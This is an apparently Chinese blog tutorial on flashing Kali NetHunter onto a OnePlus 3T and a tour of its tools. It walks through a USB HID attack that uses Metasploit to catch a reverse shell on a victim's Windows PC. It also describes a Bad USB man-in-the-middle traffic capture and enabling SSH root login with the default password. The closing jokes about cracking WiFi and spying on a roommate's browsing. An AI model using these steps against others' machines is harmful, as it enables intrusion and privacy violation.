@@ -1,0 +1,260 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>快速打造一台&#34;黑客&#34;手机--Nethunter | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0101/nethunter.jpg')">
+            </div>
+          
+          <h2 class="post-title">快速打造一台&#34;黑客&#34;手机--Nethunter</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-01-31</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/wan-ji/">
+                    玩机
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/ejBSamRum/">
+                    kali
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/NVY7YSleE6/">
+                    nethunter
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  最近在折腾Nethunter手机，发现刷机过程有点坑，于是想写篇文章记录一下，也好下次少走弯路！</p>
+<!-- more -->
+<p>  其实只要找对了正确的刷机包和刷机步骤，30分钟就可以打造一台B格满满的&quot;黑手&quot;。Nethunter下载地址请点<a href="https://build.nethunter.com/nightly">这里</a>(需要梯子才能下载),也可以点击<a href="https://pan.baidu.com/s/1ggYmleb">这里</a>(密码:v4wq)下载我所使用的所有工具和ROM包。废话不多说，刷机前的准备材料:</p>
+<ul>
+<li>一台一加3T手机</li>
+<li>一加3T工具箱,SuperSUroot包</li>
+<li>CM、氢或者氧的底包</li>
+<li>Nethunter刷机包和Nethunter内核</li>
+</ul>
+<h2 id="一-root手机并刷入第三方recovery">一. Root手机并刷入第三方Recovery</h2>
+<p>  打开一加3T工具箱，连接手机，根据提示选择12，工具箱会自动帮你刷入TWRP并root设备<br>
+<img src="https://tuchuang.looklook.workers.dev/0101/0101.png" alt="" loading="lazy"></p>
+<h2 id="二-刷入系统底包">二. 刷入系统底包</h2>
+<p>  关机后，同时按住电源键和音量下键进入TWRP模式，用数据线连接手机，根据个人选择将氢、氧或者CM底包放入手机TWRP目录，刷入底包和对应的root包(刷入前记得4清)。<br>
+<strong>注意:</strong> 开机后,进入设置--&gt;关于手机--&gt;连续点击7下版本号打开开发者模式，进入开发者模式打开USB调试和OEM锁。<br>
+<img src="https://tuchuang.looklook.workers.dev/0101/0102.png" alt="" loading="lazy"></p>
+<h2 id="三-刷入nethunter包和nethunter内核">三. 刷入Nethunter包和Nethunter内核</h2>
+<p>  关机，进入TWRP模式，复制文件到手机TWRP目录，点击install添加Nethuter包和内核包，注意顺序。刷入后开机，就可以看见炫酷的开机画面。进入手机界面后，点击Nethunter图标，给予root权限。</p>
+<h2 id="四-简单的使用文档说明">四. 简单的使用文档说明</h2>
+<p><strong>1.Home</strong><br>
+该界面可以得到手机连接WIFI分配的IP地址，点击GET EXTERNAL IP可以得到连接WIFI的外部IP</p>
+<p><strong>2.Kali Chroot Manager</strong><br>
+检测执行文件时参考的根目录，只有正确的时候才可以执行各种命令（自动安装，不需要更改）</p>
+<p><strong>3.Cheak App Update</strong><br>
+检测软件的升级(需要梯子)</p>
+<p><strong>4.Kali Services</strong><br>
+打开和关闭kali系统的各种服务，勾选Start at boot后，该服务会在手机开机的时候自启动,各种服务如下</p>
+<ul>
+<li>SSH服务:Secure Shell,方便其他设备连接控制</li>
+<li>Dnsmasq服务:DNS解析服务</li>
+<li>Hostapd服务:提供无线接入点服务</li>
+<li>OpenVPN服务:开放OpenVPN连入服务</li>
+<li>Apache服务:WEB服务</li>
+<li>Metasploit服务:为MSF攻击模块提供保障</li>
+<li>Fruity WiFi服务：WiFi审计工具服务</li>
+<li>BeEF FrameWork服务:XSS利用框架服务</li>
+</ul>
+<p><strong>5.Custom Commands</strong><br>
+自定义输入命令到kali终端，命令复杂时方便输入用户的输入，可以使用管道符。如一键打开多种服务等...</p>
+<p><strong>6.MAC Changer</strong><br>
+改变网卡的MAC地址</p>
+<p><strong>7.VNC Manager</strong><br>
+远程控制软件，可用SSH代替</p>
+<p><strong>8.HID Attacks</strong><br>
+人机接口设备攻击，下面结合msf回弹shell为例子：</p>
+<hr>
+<h3 id="01">01</h3>
+<p>  首先，打开Kali Services中的Apache服务，之后转到HID Attacks，设置PowerSploit参数，IP和端口填写MSF监听的IP端口。Payload选择windows/meterpreter/reverse_https,URL为提供Apache服务的IP,这里即是本机:192.168.10.2，写完后，UPDATE。</p>
+<h3 id="02">02</h3>
+<p>  之后进入kali终端，利用msf生成payload，此时将设备连接至PC机,等待设备被识别后,执行Execute,开始攻击.POWERSHELL命令执行后,就可在msf中看到反弹的shell了</p>
+<pre><code>root@kali:~# msfconsole
+msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt;
+.
+.
+msf exploit(handler) &gt; set LHOST 192.168.0.2
+LHOST =&gt; 192.168.10.2
+msf exploit(handler) &gt; set LPORT 4444
+LPORT =&gt; 4444
+msf exploit(handler) &gt; exploit
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/0101/0104.png" alt="" loading="lazy"></figure>
+<hr>
+<p><strong>9.DuckHunter HID</strong><br>
+模拟大黄鸭，将USB Rubber Ducky脚本转换为NetHunter HID攻击格式，具体用法和上面类似</p>
+<p><strong>10.Bad USB MITM Attack</strong><br>
+通过USB线接入受害者电脑，执行此攻击可以劫持受害者流量,kali终端会多出一个rndis0的虚拟网卡<br>
+<img src="https://tuchuang.looklook.workers.dev/0101/0105.png" alt="" loading="lazy"></p>
+<p>此时可以开启Tcpdimp截取流量：Tcpdump –i rndis0<br>
+<img src="https://tuchuang.looklook.workers.dev/0101/0106.png" alt="" loading="lazy"></p>
+<p><strong>11.Mana Wireless Toolkit</strong><br>
+蜜罐，需要配合无线网卡使用</p>
+<p><strong>12.MITM Framework</strong><br>
+中间人攻击框架，可以抓取目标的明文密码，注入shellcode</p>
+<h2 id="五-相关问题解决">五. 相关问题解决</h2>
+<p><strong>1.刷入nethunter后wifi用不了?</strong><br>
+　　内核版本有问题，换其他内核</p>
+<p><strong>2.进入不了kali的终端?</strong>　　<br>
+　　下载并安装手机终端模拟器，进入模拟器输入：su -c bootkali　　根据弹窗给予root权限后就可以进入kali终端</p>
+<p><strong>3.登陆不了ssh服务?</strong>　　<br>
+　　进入终端输入：<code>vi /etc/ssh/sshd_config</code>，找到<strong>PermitRootLogin yes</strong>这一行,去掉前面的#号，之后利用ssh root@IP登陆即可，密码为toor，前提是打开Nethunter的SSH服务</p>
+<p><strong>4.识别不了外置网卡?</strong><br>
+　　Nethunter里的很多工具都需要外接网卡,根据官方文档，以下网卡型号可以使用：</p>
+<ul>
+<li>TP-Link TL-WN722N</li>
+<li>TP-Link TL-WN822N v1 - v3</li>
+<li>Alfa Networks AWUS036NEH</li>
+<li>Alfa Networks AWUS036NHA</li>
+<li>Alfa Networks AWUS036NH</li>
+<li>Panda PAU05 Nano</li>
+</ul>
+<p><strong>5.详细的使用方法?</strong><br>
+　　其实NT就是手机版的Kali，kali里面能使用的工具，NT基本都能使用！如果将Nethunter做为渗透机器，需要为其配置大的供电设备，还需要为其配置无线网卡，有点鸡肋。不过娱乐娱乐，破解WIFI，中间人嗅探，断下室友wifi，看看室友的浏览记录和图片还是可以的,不说了晋级赛失败的室友又要来找我麻烦了，哈哈！！</p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/nethunter.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
